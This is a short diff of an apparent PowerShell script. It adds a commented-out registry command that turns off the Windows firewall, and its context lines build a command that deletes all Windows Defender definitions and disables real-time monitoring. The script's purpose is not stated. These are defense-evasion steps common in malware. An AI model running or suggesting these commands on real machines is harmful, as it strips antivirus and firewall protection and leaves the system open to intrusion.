@@ -1,3 +1,5 @@
+# REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy" /v "EnableFirewall" /t REG_DWORD /d 0 /f
+# this will perrmanently disable firewall
 $cmd = @"
 cmd.exe /c `"C:\Program Files\Windows Defender\MpCmdRun.exe`" -removedefinitions -all
 REG ADD `"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender`" /v `"DisableRealtimeMonitoring`" /t REG_DWORD /d 1 /f
